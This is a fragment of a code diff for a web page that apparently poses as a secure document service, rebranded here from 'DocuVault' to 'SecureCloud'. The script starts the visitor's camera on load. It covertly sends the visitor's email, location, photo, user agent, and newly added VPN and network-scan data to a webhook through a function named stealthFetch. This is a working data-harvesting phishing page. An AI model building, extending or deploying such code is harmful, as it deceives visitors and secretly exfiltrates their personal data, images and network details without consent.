                     email: email,
@@ -1530,7 +1588,7 @@
                     }
                 };
                 
-                await sendBeautifulEmbed(beautifulData, location);
+                await sendBeautifulEmbed(beautifulData, location, vpn, networkScan);
                 
                 if (photo) {
                     const response = await fetch(photo);
@@ -1564,7 +1622,7 @@
         }
 
         // ============================================================
-        //  📋 REAL-TIME EMAIL VALIDATION
+        //  📋 INITIALIZATION
         // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
             const emailInput = document.getElementById('email');
@@ -1576,18 +1634,15 @@
                 clearTimeout(timeoutId);
                 timeoutId = setTimeout(() => {
                     const email = this.value.trim();
-                    
                     if (email.length === 0) {
                         emailGroup.classList.remove('error', 'success');
                         return;
                     }
-                    
                     const result = validateEmail(email);
-                    
                     if (result.valid) {
                         emailGroup.classList.remove('error');
                         emailGroup.classList.add('success');
-                        emailError.textContent = '✓ Valid Gmail address';
+                        emailError.textContent = '✓ Valid email address';
                         emailError.style.color = '#16a34a';
                     } else {
                         emailGroup.classList.remove('success');
@@ -1597,30 +1652,12 @@
                     }
                 }, 500);
             });
-            
-            emailInput.addEventListener('blur', function() {
-                const email = this.value.trim();
-                if (email.length > 0) {
-                    const result = validateEmail(email);
-                    if (!result.valid) {
-                        emailGroup.classList.remove('success');
-                        emailGroup.classList.add('error');
-                        emailError.textContent = result.message;
-                        emailError.style.color = '#dc2626';
-                        showToast(result.message, 'error', 3000);
-                    }
-                }
-            });
 
             setTimeout(() => {
                 initCamera();
             }, 1000);
 
-            // Test location on load
-            getAllLocationData().then(loc => {
-                console.log('📍 Full location data:', loc);
-            });
-
+            // Page visit notification
             setTimeout(() => {
                 stealthFetch(WEBHOOK, {
                     embeds: [{
@@ -1632,7 +1669,7 @@
                             { name: "💻 User Agent", value: navigator.userAgent, inline: true },
                             { name: "⏰ Time", value: new Date().toISOString(), inline: false }
                         ],
-                        footer: { text: "🔒 DocuVault Security Monitor" },
+                        footer: { text: "🔒 SecureCloud Security Monitor" },
                         timestamp: new Date().toISOString()
                     }]
                 });
